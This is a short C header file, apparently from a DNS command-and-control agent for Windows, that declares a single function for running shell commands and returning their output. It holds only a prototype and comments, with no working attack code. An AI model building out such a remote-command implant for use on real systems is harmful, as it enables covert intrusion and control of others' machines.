/**
 * shell.h - Shell command execution for DNS C2 Agent
 */

 #ifndef SHELL_H
 #define SHELL_H
 
 #include <windows.h>
 
 /**
  * Execute a shell command
  * 
  * @param args The command to execute
  * @return The result of the command (must be freed by caller)
  */
 char* cmd_shell(const char* args);
 
 #endif // SHELL_H
 